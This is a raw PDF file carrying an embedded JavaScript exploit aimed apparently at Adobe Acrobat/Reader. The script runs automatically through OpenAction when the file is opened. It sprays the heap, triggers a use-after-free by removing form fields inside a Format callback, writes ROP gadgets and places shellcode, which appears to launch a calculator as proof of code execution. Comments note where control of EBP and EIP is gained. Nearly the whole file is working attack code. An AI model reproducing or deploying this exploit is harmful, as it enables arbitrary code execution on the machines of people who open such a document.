%PDF-1.3
1 0 obj
<<
/Kids [ 3 0 R ]
/Type /Pages
/Count 1
>>
endobj
2 0 obj
<<
/Producer (Python PDF Library \055 http\072\057\057pybrary\056net\057pyPdf\057)
>>
endobj
3 0 obj
<<
/Parent 1 0 R
/CropBox [ 0 0 595.28000 841.89000 ]
/Type /Page
/Resources <<
>>
/MediaBox [ 0 0 595.28000 841.89000 ]
>>
endobj
4 0 obj
<<
/Type /Action
/S /JavaScript
/JS (

function dbg_help(str){
    app.alert(str);
}

var tmp_arr = new Array(0x1000);
var mem_arr = new Array(0x3000);
var spray_arr = new Array(0x3000);
var AcroForm_Base = 0x20800000 ; /*  [+] here u need a information leak vulnerability to get the base*/
var fill_heap = new Array(0x4000);

var shellcode = [0x52d23160, 0x6c616368, 0x52595463, 0x728b6451, 0x0c768b30, 0xad0c768b, 0x7e8b308b, 0x3c5f8b18, 0x781f5c8b, 0x201f748b, 0x548bfe01, 0xb70f241f, 0x4242172c, 0x073c81ad, 0x456e6957, 0x748bf075, 0xfe011c1f, 0xffae3c03, 0x615858d7, 0x000000c3, 0xcccccccc];
var field_arr = new Array(0x500);
function fill_nsize_heap(nsize){
    var input = unescape("%u200d");

    for(var i = 0; i < (nsize - 6) / 2; i++){
        input += unescape("%ue0d0");
    }

    var fill_list = this.addField("lb", "listbox", 0, [0, 0, 300, 300]);
    for(var i = 0; i < 0x500; i++){
        field_arr[i] = input;
    }
    fill_list.setItems(field_arr);
}


function heap_spray(){
    for(var i = 1; i < 0x80; i++){
        field_arr[i] = this.addField("Field_" + i, "text", 0, [0, 800, 55, 850]);
    }
    for(var i = 1; i < 0x1000; i++){
        mem_arr[i] = new Uint32Array(0x28); 
        mem_arr[i][0x1a] = 0x12345678;
        mem_arr[i][0x1b] = 0x87654321;
    }

    for(var i = 0; i < 0x1000; i++){
        tmp_arr[i] = new Uint32Array(1);
    }

    
    for(var i = 1; i < 0x3000; i++){
        spray_arr[i] = new ArrayBuffer(0x10000-24);
    }
    

    for(var i = 0x100; i < 0x800; i += 2){
        delete mem_arr[i];    
        mem_arr[i] = null;
    }
}

function evil_callback(){
    event.target = f2;
    t.removeField("Field");
    for(var i = 1; i < 0x80; i++){
        t.removeField("Field_" + i);
    }
    /*
    *   [+] 这个地方我希望即使他抢占, 也是抢占的其他的hole, 而不是这个地方的hole
    */
    dbg_help("[+] heap");
    fill_nsize_heap(0xb0);

    for(var i = 1; i < 0x3000; i++){
        var dv = new DataView(spray_arr[i]);
        var rop_offset = [0x00000217 - 4, 0x1a4 - 4, 0x1b7, 0x000001e9 - 4, 0x200 - 4];
        for(var j = 0; j < rop_offset.length; j++){
            dv.setUint32(rop_offset[j] + 0 * 4, 9456208 + AcroForm_Base, true);
            dv.setUint32(rop_offset[j] + 2 * 4, 0x000f1d41 + AcroForm_Base, true);
            dv.setUint32(rop_offset[j] + 3 * 4, 0x0d0e0058   , true);
            dv.setUint32(rop_offset[j] + 0x10* 4, 0x005011ef +AcroForm_Base , true);
        }

        dv.setUint32(1 * 4, AcroForm_Base + 0x0006f845  , true);
        dv.setUint32(3 * 4, 0x0d0e007c  , true);    /*  [+] here, we could control ebp*/
        dv.setUint32(4 * 4, AcroForm_Base + 0x0007eea6 , true);
        dv.setUint32(5 * 4, 0x0d0e8058  , true);
        dv.setUint32(6 * 4, 0x1000 , true);
        dv.setUint32(7 * 4, 0x40 , true);
        dv.setUint32(8 * 4, 0x0d0e1058 , true);
        dv.setUint32(10 * 4, 0x0d0e8058, true);  /*  [+] control eip*/
        
        
        /*  [+] at here, we could allocate shellcode*/
        for(var j = 0; j < shellcode.length; j++){
            dv.setUint32(0x8000 + j * 4, shellcode[j], true);
        }
    }
    
}

heap_spray();   /*  [+] 啊啊啊啊啊啊! 堆喷完成... */
var time_one = app.setTimeOut("trigger_the_bug()", 3500);
function trigger_the_bug(){
    var f = this.addField("Field", "text", 0, [0, 800, 55, 850]);
    f2 = this.addField("zxc", "text", 0, [0+100, 800, 55+100, 850]);
    t = this;
    f.setAction("Format",'evil_callback()'); //reassign event.target with f2 that has different name
}
    
)
>>
endobj
5 0 obj
<<
/Type /Catalog
/Pages 1 0 R
/OpenAction 4 0 R
>>
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000068 00000 n 
0000000169 00000 n 
0000000308 00000 n 
0000000626 00000 n 
trailer
<<
/Size 6
/Root 5 0 R
/Info 2 0 R
>>
startxref
693
%%EOF
